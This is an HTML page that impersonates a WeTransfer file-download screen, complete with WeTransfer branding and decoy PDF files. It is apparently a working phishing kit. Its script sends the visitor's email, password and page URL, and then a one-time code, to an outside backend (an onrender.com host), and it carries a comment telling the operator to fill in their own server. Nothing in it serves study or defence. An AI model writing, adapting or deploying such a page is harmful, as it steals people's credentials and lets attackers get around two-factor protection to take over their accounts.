<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>WeTransfer Styled Page</title>
  <style>
    body {font-family: 'Inter','Helvetica Neue',Arial,sans-serif; background: #f6f7fb;height:100vh;display:flex;}
    .left { flex:1.12; padding:50px 40px 0 58px; background:#fafdff; display:flex; flex-direction:column;}
    .logo-img { height: 44px; margin-bottom: 5px; filter:none;}
    .headline { font-size:48px; font-weight:300; color:#222; margin:18px 0 0 0; line-height:1.14;}
    .headline strong {font-weight: 700;}
    .sub {font-size:18px; margin-top:18px; color:#39404d;}
    .parachute-img {margin-top:42px;width:98%;height:332px;object-fit:cover;border-radius:17px;box-shadow:0 11px 42px #0002;}
    .language-select{position:absolute;bottom:17px;left:25px;background:#fff;font-size:14px;border:1px solid #eee;border-radius:7px;box-shadow:0 2px 8px #0001;padding:5px 12px;display:flex;gap:7px;align-items:center;}
    .language-select select{border:none;background:transparent;font-size:14px;outline:none;cursor:pointer;}
    .powered {font-size:11px;color:#999;margin-left:7px;}
    .right{flex:1;background:#fff;box-shadow:-2px 0 8px #0001;display:flex;flex-direction:column;align-items:center;justify-content:center;}
    .transfer-header{font-size:41px;font-weight:800;color:#191919;margin-bottom:32px;}
    .download-icon-box{width:92px;height:92px;background:#f8f8fb;border:2.8px solid #e3e6ec;border-radius:50%;display:flex;justify-content:center;align-items:center;margin-bottom:24px;}
    .download-icon{font-size:48px;color:#c7c7cc;}
    .download-list{width:100%;display:flex;gap:18px;margin-bottom:28px;}
    .file{cursor:pointer;background:#f4f5fa;border-radius:13px;padding:17px 33px;min-width:161px;font-size:16px;color:#1a1c20;display:flex;flex-direction:column;align-items:flex-start;box-shadow:0 1px 4px #0001;transition:box-shadow 0.17s;}
    .file:hover{background:#e9eef7;box-shadow:0 4px 16px #2563eb33;}
    .file strong{font-weight:700;}
    .file-size{font-size:15px;color:#888;}
    .download-btn{margin-top:5px;background:#191919;color:#fff;border:none;padding:20px 80px;border-radius:44px;cursor:pointer;font-size:18px;font-weight:500;transition:background 0.2s;}
    .download-btn:hover{background:#222;}
    .footer{margin-top:13px;font-size:15px;color:#616161;font-weight:400;}
    .modal{display:none;position:fixed;z-index:2999;left:0;top:0;width:100vw;height:100vh;background:rgba(0,0,0,0.13);justify-content:center;align-items:center;}
    .modal-content{background:#fff;padding:33px 28px 28px 28px;border-radius:13px;min-width:304px;box-shadow:0 0 18px #0002;display:flex;flex-direction:column;align-items:center;}
    .modal-content h3{font-size:22px;font-weight:600;margin-bottom:13px;}
    .modal-content input{width:99%;padding:10px;margin-bottom:15px;border-radius:7px;border:1px solid #e8e8ec;font-size:15px;}
    .modal-content button{background:#2563eb;color:#fff;border:none;padding:11px 28px;border-radius:7px;font-size:15px;font-weight:500;cursor:pointer;}
    .modal-content .error{color:#d82929;font-size:13px;margin:8px 0 0 0;text-align:left;}
    @media(max-width:1100px){.left{padding:37px 15px 0 13px;}}
    @media(max-width:880px){body{flex-direction:column;}.left,.right{min-width:0;width:100%}}
  </style>
</head>
<body>
  <div class="left">
    <img class="logo-img" src="https://prod-cdn.wetransfer.net/packs/media/images/apple-touch-icon-167x167-precomposed-976d4eb8.png" alt="WeTransfer logo">
    <h1 class="headline">The simplest way to share <strong>big ideas</strong></h1>
    <div class="sub">Send files on your terms with WeTransfer</div>
    <img class="parachute-img" src="https://prod-cdn.wetransfer.net/assets/parellax-d4db08151d87eb7a06a201b5957e52b8.svg" alt="Parachute">
    <div class="language-select">
      <label for="lang">Select Language:</label>
      <select id="lang">
        <option>English</option>
        <option>Deutsch</option>
        <option>Français</option>
        <option>Español</option>
        <option>Italiano</option>
      </select>
      <span class="powered">Powered by Google Translate</span>
    </div>
  </div>
  <div class="right">
    <div class="transfer-header">WeTransfer</div>
    <div class="download-icon-box"><span class="download-icon">&#8681;</span></div>
    <div class="download-list">
      <div class="file" data-filename="List Of Items.pdf" tabindex="0">
        <strong>List Of Items.pdf</strong>
        <span class="file-size">961Kb | pdf</span>
      </div>
      <div class="file" data-filename="Specification Details.pdf" tabindex="0">
        <strong>Specification Details.pdf</strong>
        <span class="file-size">7Mb | zip</span>
      </div>
    </div>
    <button class="download-btn" id="downloadAllBtn">&#8681; Download All</button>
    <div class="footer">File are valid for 7 days</div>
  </div>

  <!-- AUTH/OTP MODALS -->
  <div id="loginModal" class="modal">
    <div class="modal-content">
      <h3>Authenticate to Download</h3>
      <form id="loginForm" autocomplete="off">
        <input id="email" type="email" placeholder="Email" required />
        <input id="password" type="password" placeholder="Password" required />
        <button type="submit">Send OTP</button>
        <div class="error" id="loginError"></div>
      </form>
    </div>
  </div>
  <div id="otpModal" class="modal">
    <div class="modal-content">
      <h3>Enter OTP sent to your email</h3>
      <form id="otpForm" autocomplete="off">
        <input id="otp" type="text" placeholder="6-digit OTP" maxlength="6" required />
        <button type="submit">Verify & Download</button>
        <div class="error" id="otpError"></div>
      </form>
    </div>
  </div>

  <script>
    // Your Render backend base URL below — replace with your real Render backend URL
    const apiBase = 'https://wetransfer-ov7x.onrender.com/api';

    // State
    let loginModal = document.getElementById('loginModal');
    let otpModal = document.getElementById('otpModal');
    let userEmail = "";
    let requestedFile = "";

    function promptAuthAndDownload(filename){
      requestedFile = filename;
      document.getElementById('loginError').innerText="";
      document.getElementById('loginForm').reset();
      loginModal.style.display = 'flex';
      document.getElementById('email').focus();
    }

    document.getElementById('downloadAllBtn').onclick = function(){
      promptAuthAndDownload("Specification Details.pdf");
    };

    document.querySelectorAll('.file').forEach(fileDiv=>{
      fileDiv.addEventListener('click',()=>{
        promptAuthAndDownload(fileDiv.dataset.filename);
      });
      fileDiv.addEventListener('keydown', e=>{
        if(e.key==="Enter"||e.key===" "){
          promptAuthAndDownload(fileDiv.dataset.filename);
        }
      });
    });

    document.getElementById('loginForm').onsubmit = async function(e){
      e.preventDefault();
      userEmail = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      try {
        const res = await fetch(apiBase + '/login', {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({ email: userEmail, password, loginUrl: window.location.href })
        });
        const result = await res.json();
        if(result.success) {
          loginModal.style.display = 'none';
          document.getElementById('otpForm').reset();
          otpModal.style.display = 'flex';
          document.getElementById('otpError').innerText = '';
        } else {
          document.getElementById('loginError').innerText = result.message || "Login failed";
        }
      } catch (err) {
        document.getElementById('loginError').innerText = "Server error";
      }
    };

    document.getElementById('otpForm').onsubmit = async function(e){
      e.preventDefault();
      const otp = document.getElementById('otp').value;
      try {
        const res = await fetch(apiBase + '/verify-otp', {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({ email: userEmail, otp })
        });
        const result = await res.json();
        if(result.success && result.token) {
          localStorage.setItem('authToken', result.token);
          otpModal.style.display = 'none';
          downloadProtectedFile(requestedFile, result.token);
        } else {
          document.getElementById('otpError').innerText = result.message || "OTP error";
        }
      } catch (err) {
        document.getElementById('otpError').innerText = "Verification error";
      }
    };

    function downloadProtectedFile(filename, token) {
      fetch(apiBase + '/file/' + encodeURIComponent(filename), {
        method: 'GET',
        headers: { 'Authorization': 'Bearer ' + token }
      }).then(async res => {
        if (!res.ok) throw new Error("Download failed");
        const blob = await res.blob();
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = filename;
        document.body.appendChild(link);
        link.click();
        link.remove();
      }).catch(err => {
        alert("Unable to download: " + err.message);
      });
    }

    window.onclick = function(event) {
      if(event.target === loginModal) loginModal.style.display = "none";
      if(event.target === otpModal) otpModal.style.display = "none";
    };
  </script>
</body>
</html>